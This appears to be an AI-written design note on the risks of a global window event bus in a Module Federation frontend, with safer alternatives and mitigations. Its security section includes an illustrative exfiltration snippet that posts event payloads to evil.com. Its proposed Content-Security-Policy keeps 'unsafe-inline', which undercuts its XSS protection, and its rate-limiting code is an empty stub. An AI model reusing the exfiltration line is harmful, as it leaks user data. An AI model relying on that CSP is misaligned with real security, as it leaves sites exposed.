# Event Bus - Production Risks & Solutions

## 🚨 Current Implementation Risks

### Using `window.__EVENT_BUS__`

```typescript
// Current approach
window.__EVENT_BUS__ = new EventBus();
export const eventBus = window.__EVENT_BUS__;
```

**Risks:**

1. **Global Namespace Pollution** 🌍
   ```javascript
   // Any script can access/modify
   window.__EVENT_BUS__ = null; // Breaks everything!
   window.__EVENT_BUS__.emit = () => {}; // Malicious override
   ```

2. **Security Vulnerabilities** 🔓
   - XSS attacks can hijack event bus
   - Third-party scripts can listen to all events
   - Sensitive data in events exposed globally
   
   ```javascript
   // Malicious script
   window.__EVENT_BUS__.on('data:share', (payload) => {
     fetch('https://evil.com/steal', { method: 'POST', body: JSON.stringify(payload) });
   });
   ```

3. **SSR/SSG Incompatibility** 🖥️
   ```typescript
   // Breaks in Node.js/SSR
   if (typeof window === 'undefined') {
     // Event bus doesn't work!
   }
   ```

4. **Testing Nightmares** 🧪
   ```typescript
   // Test isolation issues
   beforeEach(() => {
     // Must manually clean window
     delete window.__EVENT_BUS__;
   });
   ```

5. **Type Safety Issues** ⚠️
   ```typescript
   // TypeScript can't guarantee window properties
   window.__EVENT_BUS__?.emit(...); // Always need optional chaining
   ```

6. **Hard to Debug** 🐛
   - Event bus can be modified anywhere
   - No clear ownership
   - Stack traces unhelpful

## ✅ Better Solutions

### Option 1: Enhanced Window (Quick Fix) ⚡

Add safety layers while keeping window approach:

```typescript
// packages/shared/lib/event-bus-safe.ts
const NAMESPACE = Symbol.for('@microservice-research/event-bus');

declare global {
  interface Window {
    [NAMESPACE]?: EventBus;
  }
}

// Use Symbol to avoid naming collisions
if (typeof window !== 'undefined' && !window[NAMESPACE]) {
  window[NAMESPACE] = new EventBus();
  
  // Make it read-only
  Object.defineProperty(window, NAMESPACE, {
    writable: false,
    configurable: false,
  });
}

export const eventBus = typeof window !== 'undefined' 
  ? window[NAMESPACE]! 
  : new EventBus();
```

**Improvements:**
- ✅ Symbol prevents collisions
- ✅ Read-only prevents tampering
- ⚠️ Still has SSR issues

### Option 2: Module Federation Remote (Recommended) 🏆

```typescript
// 1. Portfolio-home exposes event-bus
// vite.config.ts
federation({
  name: 'portfolio-home',
  exposes: {
    './event-bus': '../shared/lib/event-bus',
  }
})

// 2. Remotes import from portfolio-home
// interface-generator/src/hooks/useEventBus.ts
import { eventBus } from 'portfolio-home/event-bus';
```

**Benefits:**
- ✅ Module Federation handles singleton
- ✅ No global scope
- ✅ Type-safe
- ✅ Proper dependency management

### Option 3: Dedicated Package (Production-Ready) 🚀

```bash
# Create new package
packages/event-bus/
├── package.json
├── src/
│   ├── index.ts
│   └── types.ts
└── tsconfig.json
```

```json
// package.json
{
  "name": "@microservice-research/event-bus",
  "version": "1.0.0",
  "main": "./dist/index.js",
  "types": "./dist/index.d.ts"
}
```

All packages import it normally:
```typescript
import { eventBus } from '@microservice-research/event-bus';
```

**Benefits:**
- ✅ Clean architecture
- ✅ Versioning support
- ✅ Works everywhere (SSR, testing)
- ✅ Can be published to npm
- ✅ Proper TypeScript support

## 📊 Risk Comparison

| Risk | Window | Enhanced Window | MF Remote | Package |
|------|--------|----------------|-----------|---------|
| XSS Attack | 🔴 High | 🟡 Medium | 🟢 Low | 🟢 Low |
| SSR Issues | 🔴 Broken | 🔴 Broken | 🟢 Works | 🟢 Works |
| Testing | 🔴 Hard | 🟡 Medium | 🟢 Easy | 🟢 Easy |
| Type Safety | 🟡 Partial | 🟡 Partial | 🟢 Full | 🟢 Full |
| Maintenance | 🟡 Medium | 🟡 Medium | 🟢 Easy | 🟢 Easy |
| Performance | 🟢 Fast | 🟢 Fast | 🟢 Fast | 🟢 Fast |

## 🎯 Recommendations by Use Case

### For Learning/Prototyping
✅ **Current window approach is FINE**
- It works
- Simple to understand
- No need to over-engineer

### For MVP/Demo
✅ **Enhanced Window** (Option 1)
- Quick to implement
- Adds safety
- Good enough for demos

### For Production
🏆 **Dedicated Package** (Option 3)
- Professional
- Maintainable
- Scalable
- Best practices

## 🛠️ Quick Migration Path

If you want to upgrade later:

```typescript
// Phase 1: Current (working now)
window.__EVENT_BUS__

// Phase 2: Enhanced (add safety)
window[Symbol.for('@mf/event-bus')]

// Phase 3: Package (production)
@microservice-research/event-bus
```

Each phase is backward compatible!

## 💡 My Opinion

For your current project:
1. **Keep it as is** - it's working! ✅
2. **Add monitoring** - log when event bus initializes
3. **Document risks** - team knows trade-offs
4. **Plan migration** - when going to production

Don't over-engineer early. The window approach is a **pragmatic solution** for Module Federation development. Just be aware of the risks and plan to upgrade before production deployment.

## 🔒 Security Mitigation (Current Setup)

If keeping window approach, add these protections:

```typescript
// 1. Content Security Policy
// In portfolio-home server config
headers: {
  'Content-Security-Policy': "script-src 'self' 'unsafe-inline';"
}

// 2. Freeze event bus
if (window.__EVENT_BUS__) {
  Object.freeze(window.__EVENT_BUS__);
}

// 3. Event validation
eventBus.on('data:share', (payload) => {
  if (!isValidPayload(payload)) {
    console.error('Invalid event payload blocked');
    return;
  }
  // Process event
});

// 4. Rate limiting
const rateLimiter = new Map();
eventBus.on = (event, callback) => {
  // Add rate limiting logic
};
```

## Summary

**Current Risk Level: 🟡 MEDIUM**
- OK for development ✅
- OK for internal demo ✅
- NOT OK for public production ❌
- NOT OK with sensitive data ❌

**Action Items:**
1. ✅ Keep using it now (it works!)
2. 📝 Document in README that it's for dev
3. 🎯 Plan migration to package before production
4. 🔒 Add CSP and freeze object
5. 🧪 Add integration tests

Bạn muốn tôi implement Enhanced Window version với security improvements không? Hoặc giữ nguyên như hiện tại? 🤔
